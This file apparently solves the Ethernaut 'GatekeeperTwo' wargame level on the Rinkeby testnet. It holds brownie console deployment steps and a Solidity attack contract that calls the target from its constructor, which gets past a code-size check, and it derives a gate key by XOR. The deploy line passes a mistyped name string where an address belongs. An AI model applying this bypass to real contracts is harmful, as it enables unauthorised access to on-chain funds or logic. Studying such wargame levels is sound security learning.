/*

# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")

# deploy Attack Contract

GatekeeperTwoAttack.deploy("GateKeerperTwo",{'from': a[0]})

# submit

# (OPTIONAL) call destroy()



*/


// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


contract GatekeeperTwoAttack {

    
    constructor(address _address)  public {

/*

 a call from a contract passes gateOne check 
 a call from constructor passes gateTwo since the the contract code will be zero while in the constructor

 */

        // gateThree pass code below
        bytes8 mygate = bytes8(keccak256(abi.encodePacked(address(this))));
        mygate = mygate ^ 0xffffffffffffffff; // or uint64(0) - 1  => XOR with 1's inverts mygate so the the XOR in the GateKeeperTwo contract result in 1's 
        (bool success,) = _address.call(abi.encodeWithSignature('enter(bytes8)', mygate));
        require(success);
    }

    function destroy() external {

        selfdestruct(msg.sender);

    }
}

